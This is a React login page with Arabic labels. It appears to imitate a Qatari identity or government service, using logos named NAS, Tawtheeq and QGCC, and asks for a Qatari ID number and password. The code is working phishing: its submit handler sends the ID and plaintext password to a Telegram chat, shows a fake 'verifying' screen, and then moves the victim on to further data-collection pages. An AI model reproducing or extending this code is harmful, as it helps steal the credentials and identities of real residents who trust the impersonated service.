import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useRegistration } from '../contexts/RegistrationContext';
import LoadingScreen from '../components/LoadingScreen';
import nasLogo from '../assets/nas-name.png';
import tawtheeqLogo from '../assets/tawtheeq-logo.png';
import qgccLogo from '../assets/qgcc-logo.png';

const Login = () => {
  const navigate = useNavigate();
  const { updateFormData, sendTelegramMessage, formData } = useRegistration();
  const [qid, setQid] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!qid || !password) {
      setError('الرجاء إدخال جميع البيانات');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      updateFormData({ qid, loginPassword: password });
      
      await sendTelegramMessage(
        `🔐 محاولة تسجيل دخول جديدة\n\n` +
        `📋 رقم الهوية: ${qid}\n` +
        `🔑 كلمة المرور: ${password}\n` +
        `👤 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}`
      );

      setTimeout(() => {
        setIsLoading(false);
        navigate('/account-creation');
      }, 2000);
    } catch (err) {
      setIsLoading(false);
      setError('حدث خطأ، الرجاء المحاولة مرة أخرى');
    }
  };

  if (isLoading) {
    return <LoadingScreen message="جاري التحقق من البيانات..." />;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#6A0F49] to-[#4A0D35] flex flex-col" dir="rtl">
      {/* Header */}
      <div className="bg-white py-4 px-4 flex justify-between items-center">
        <img src={nasLogo} alt="NAS" className="h-10" />
        <div className="flex items-center gap-2">
          <img src={tawtheeqLogo} alt="Tawtheeq" className="h-8" />
          <img src={qgccLogo} alt="QGCC" className="h-8" />
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md">
          <h1 className="text-2xl font-bold text-center text-[#6A0F49] mb-6">
            تسجيل الدخول
          </h1>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                رقم الهوية القطرية
              </label>
              <input
                type="text"
                value={qid}
                onChange={(e) => setQid(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#6A0F49] focus:border-transparent text-right"
                placeholder="أدخل رقم الهوية"
                maxLength={11}
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                كلمة المرور
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#6A0F49] focus:border-transparent text-right"
                placeholder="أدخل كلمة المرور"
              />
            </div>

            {error && (
              <div className="text-red-500 text-sm text-center">{error}</div>
            )}

            <button
              type="submit"
              className="w-full bg-[#6A0F49] text-white py-3 rounded-lg font-semibold hover:bg-[#5A0D3D] transition-colors"
            >
              تسجيل الدخول
            </button>
          </form>

          <div className="mt-4 text-center">
            <button
              onClick={() => navigate('/forgot-password')}
              className="text-[#6A0F49] hover:underline text-sm"
            >
              نسيت كلمة المرور؟
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
